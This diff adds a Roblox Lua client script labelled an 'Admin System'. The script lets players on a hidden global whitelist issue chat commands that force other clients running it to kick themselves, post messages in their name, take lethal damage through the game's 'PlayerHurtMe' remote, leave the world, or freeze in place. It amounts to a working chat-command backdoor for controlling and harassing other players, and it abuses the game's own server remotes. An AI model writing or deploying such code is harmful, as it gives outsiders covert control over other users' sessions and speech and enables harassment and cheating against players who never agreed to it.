@@ -1,0 +1,157 @@
+--// SERVICES //--
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+--// INITIALIZE //--
+local Whitelist = _G.G_Whitelist or {}
+local KickMsg = _G.DefaultKickMessage or "Kicked."
+
+--// HELPERS //--
+local function getChar(plr)
+    local p = plr or LocalPlayer
+    return p.Character or p.CharacterAdded:Wait()
+end
+
+local function getTarget(str)
+    if not str then return nil end
+    local lowStr = str:lower()
+    if lowStr == "all" or lowStr == "everyone" then return "all" end
+    
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower():sub(1, #lowStr) == lowStr or p.DisplayName:lower():sub(1, #lowStr) == lowStr then
+            return p
+        end
+    end
+    return nil 
+end
+
+--// COMMAND REPOSITORY //--
+local Commands = {}
+
+Commands.check = function()
+    local cb = ReplicatedStorage:FindFirstChild("CB")
+    if cb then cb:FireServer(".") end
+end
+
+Commands.changename = function(sender, args, fullText)
+    local newName = fullText:sub(13):gsub("'", ""):gsub('"', "")
+    if newName == "" then return end
+    local char = sender.Character
+    if char then
+        local tagUI = char:FindFirstChild("NameTagUI", true)
+        local label = tagUI and tagUI:FindFirstChild("Text", true)
+        if label then
+            label.Text = newName
+            if label:FindFirstChild("Shadow") then label.Shadow.Text = newName end
+        end
+    end
+end
+
+Commands.changetag = function(sender, args)
+    local country = args[1]
+    if country then
+        sender:SetAttribute("country", country)
+        local char = sender.Character
+        local tagUI = char and char:FindFirstChild("NameTagUI", true)
+        local icon = tagUI and tagUI:FindFirstChild("Icon", true)
+        local label = icon and icon:FindFirstChild("TextLabel")
+        if label then label.Text = country end
+    end
+end
+
+Commands.kick = function(sender, args, _, isTargeted)
+    if not isTargeted then return end
+    local reason = table.concat(args, " ", 2) or KickMsg
+    if not Whitelist[LocalPlayer.Name] then
+        LocalPlayer:Kick("\n" .. reason)
+    end
+end
+
+Commands.say = function(sender, args, _, isTargeted)
+    if not isTargeted then return end
+    local msg = table.concat(args, " ", 2)
+    local cb = ReplicatedStorage:FindFirstChild("CB")
+    if cb and msg ~= "" then cb:FireServer(msg) end
+end
+
+Commands.kill = function(sender, args, _, isTargeted)
+    if not isTargeted then return end
+    local rem = ReplicatedStorage:WaitForChild("Remotes", 3):FindFirstChild("PlayerHurtMe")
+    if rem then rem:FireServer(100) end
+end
+
+Commands.leave = function(sender, args, _, isTargeted)
+    if not isTargeted then return end
+    local rem = ReplicatedStorage:WaitForChild("Remotes", 3):FindFirstChild("RequestPlayerExitWorld")
+    if rem and rem:IsA("RemoteFunction") then
+        rem:InvokeServer()
+    else
+        LocalPlayer:Kick("Relocating...")
+    end
+end
+
+Commands.freeze = function(sender, args, _, isTargeted)
+    if not isTargeted then return end
+    local root = getChar():FindFirstChild("HumanoidRootPart")
+    if root then root.Anchored = true end
+end
+
+Commands.unfreeze = function(sender, args, _, isTargeted)
+    if not isTargeted then return end
+    local root = getChar():FindFirstChild("HumanoidRootPart")
+    if root then root.Anchored = false end
+end
+
+--// PROCESSING //--
+local lastCmd = ""
+local function processMsg(sender, fullText)
+    if not Whitelist[sender.Name] or fullText == lastCmd then return end
+    lastCmd = fullText
+    task.delay(0.5, function() lastCmd = "" end)
+
+    local split = fullText:split(" ")
+    local cmdName = split[1] and split[1]:lower():gsub(":", "")
+    if not cmdName then return end
+
+    local target = getTarget(split[2])
+    local isTargeted = (target == "all" or target == LocalPlayer)
+
+    if Commands[cmdName] then
+        Commands[cmdName](sender, split, fullText, isTargeted)
+    end
+end
+
+--// HOOKS //--
+local function hook(plr)
+    if Whitelist[plr.Name] then
+        plr.Chatted:Connect(function(msg) processMsg(plr, msg) end)
+    end
+end
+
+-- Bubble Chat Hook
+task.spawn(function()
+    local pGui = LocalPlayer:WaitForChild("PlayerGui")
+    while true do
+        local bChat = pGui:FindFirstChild("BubbleChat")
+        local bList = bChat and bChat:FindFirstChild("BubbleChatList", true)
+        if bList then
+            bList.ChildAdded:Connect(function(child)
+                task.wait(0.1)
+                local tl = child:FindFirstChildWhichIsA("TextLabel", true)
+                if tl then
+                    for _, admin in pairs(Players:GetPlayers()) do
+                        if Whitelist[admin.Name] then processMsg(admin, tl.Text) end
+                    end
+                end
+            end)
+            break
+        end
+        task.wait(0.5)
+    end
+end)
+
+for _, p in pairs(Players:GetPlayers()) do hook(p) end
+Players.PlayerAdded:Connect(hook)
+
+print("[CLOUD] Admin System Active.")
